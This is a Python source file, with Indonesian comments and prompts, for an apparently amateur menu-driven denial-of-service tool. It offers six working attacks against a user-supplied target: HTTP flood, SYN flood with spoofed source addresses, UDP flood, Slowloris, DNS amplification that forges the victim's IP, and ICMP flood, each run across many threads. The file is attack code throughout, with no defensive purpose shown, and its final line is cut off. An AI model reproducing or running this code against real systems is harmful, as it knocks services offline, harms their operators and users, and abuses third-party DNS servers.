import requests
import threading
import socket
import random
import time
import os
from scapy.all import *

# Warna ANSI Escape Code
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
RESET = "\033[0m"

# Tampilan ASCII Art
def banner():
    os.system("clear")
    print(f"""{GREEN}
 ██████╗ ██████╗  ██████╗ ███████╗
██╔════╝ ██╔══██╗██╔═══██╗██╔════╝
██║  ███╗██████╔╝██║   ██║███████╗
██║   ██║██╔═══╝ ██║   ██║╚════██║
╚██████╔╝██║     ╚██████╔╝███████║
 ╚═════╝ ╚═╝      ╚═════╝ ╚══════╝
{RESET}""")

    print(f"{CYAN}╔══════════════════════════════════════════════╗")
    print(f"{CYAN}║         {GREEN}DDOS ATTACK TOOL - MULTI MODE{CYAN}         ║")
    print(f"{CYAN}╚══════════════════════════════════════════════╝{RESET}\n")
    print(f"{RED}Author:Wayan Gledy   Komunitas:SultengRat7{RESET}\n")
# Fungsi Loading
def loading():
    anim = ["[■□□□□□□□□□]", "[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
    for i in range(10):
        time.sleep(0.1)
        print(f"\r{YELLOW}Loading {anim[i]}{RESET}", end="", flush=True)
    print("\n")

# Fungsi HTTP Flood
def http_flood(target_url, threads):
    print(f"{GREEN}[+] Menjalankan HTTP Flood ke {target_url} dengan {threads} thread{RESET}")
    loading()

    def attack():
        while True:
            try:
                headers = {"User-Agent": "Mozilla/5.0"}
                response = requests.get(target_url, headers=headers)
                print(f"{GREEN}[+] HTTP Request sent! Status: {response.status_code}{RESET}")
            except:
                print(f"{RED}[-] HTTP Flooding failed!{RESET}")
    
    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.start()

# Fungsi SYN Flood
def syn_flood(target_ip, target_port):
    print(f"{GREEN}[+] Menjalankan SYN Flood ke {target_ip}:{target_port}{RESET}")
    loading()

    def attack():
        while True:
            ip = IP(src=str(random.randint(1, 255)) + "." + str(random.randint(1, 255)) + "." + str(random.randint(1, 255)) + "." + str(random.randint(1, 255)), dst=target_ip)
            syn = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
            packet = ip/syn
            send(packet, verbose=False)

    for _ in range(100):
        t = threading.Thread(target=attack)
        t.start()

# Fungsi UDP Flood
def udp_flood(target_ip, target_port):
    print(f"{GREEN}[+] Menjalankan UDP Flood ke {target_ip}:{target_port}{RESET}")
    loading()

    def attack():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1024)
        while True:
            sock.sendto(bytes, (target_ip, target_port))
            print(f"{CYAN}[*] Sent UDP packet to {target_ip}:{target_port}{RESET}")

    for _ in range(100):
        t = threading.Thread(target=attack)
        t.start()

# Fungsi Slowloris Attack
def slowloris_attack(target, port):
    print(f"{GREEN}[+] Menjalankan Slowloris Attack ke {target}:{port}{RESET}")
    loading()

    def attack():
        sockets = []
        for _ in range(200):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
                sockets.append(s)
            except:
                break
        
        while True:
            for s in sockets:
                try:
                    s.send("X-a: b\r\n".encode("utf-8"))
                except:
                    sockets.remove(s)
            time.sleep(15)

    t = threading.Thread(target=attack)
    t.start()

# Fungsi DNS Amplification Attack
def dns_amplification(target_ip, dns_server):
    print(f"{GREEN}[+] Menjalankan DNS Amplification ke {target_ip} via {dns_server}{RESET}")
    loading()

    def attack():
        dns_request = IP(dst=dns_server, src=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))
        send(dns_request, loop=1)

    t = threading.Thread(target=attack)
    t.start()

# Fungsi ICMP Flood Attack
def icmp_flood(target_ip):
    print(f"{GREEN}[+] Menjalankan ICMP Flood ke {target_ip}{RESET}")
    loading()

    def attack():
        while True:
            packet = IP(dst=target_ip)/ICMP()/("X" * 1024)
            send(packet, verbose=False)

    for _ in range(100):
        t = threading.Thread(target=attack)
        t.start()

# Menu Pemilihan Serangan
def main():
    banner()

    print(f"{BLUE}╔══════════════════════════╗")
    print(f"{BLUE}║      {YELLOW}Pilih Jenis Serangan{BLUE}      ║")
    print(f"{BLUE}╠══════════════════════════╣")
    print(f"{BLUE}║ {GREEN}[1]{CYAN} HTTP Flood              {BLUE}║")
    print(f"{BLUE}║ {GREEN}[2]{CYAN} SYN Flood               {BLUE}║")
    print(f"{BLUE}║ {GREEN}[3]{CYAN} UDP Flood               {BLUE}║")
    print(f"{BLUE}║ {GREEN}[4]{CYAN} Slowloris Attack        {BLUE}║")
    print(f"{BLUE}║ {GREEN}[5]{CYAN} DNS Amplification       {BLUE}║")
    print(f"{BLUE}║ {GREEN}[6]{CYAN} ICMP Flood              {BLUE}║")
    print(f"{BLUE}╚══════════════════════════╝{RESET}")

    choice = input(f"{YELLOW}Pilih jenis serangan (1-6): {RESET}")

    if choice == "1":
        target_url = input("Masukkan URL target: ")
        threads = int(input("Jumlah threads: "))
        http_flood(target_url, threads)

    elif choice == "2":
        target_ip = input("Masukkan IP target: ")
        target_port = int(input("Masukkan port target: "))
        syn_flood(target_ip, target_port)

    elif choice == "3":
        target_ip = input("Masukkan IP target: ")
        target_port = int(input("Masukkan port target: "))
        udp_flood(target_ip, target_port)

    elif choice == "4":
        target = input("Masukkan URL target: ")
        port = int(input("Masukkan port target: "))
        slowloris_attack(target, port)

    elif choice == "5":
        target_ip = input("Masukkan IP target: ")
        dns_server = input("Masukkan DNS server: ")
        dns_amplification(target_ip, dns_server)

    elif choice == "6":
        target_ip = input("Masukkan IP target: ")
        icmp_flood(target_ip)

    else:
        print(f"{RED}Pilihan tidak valid!{RESET}")

if __name__ == "__main__":
    main(
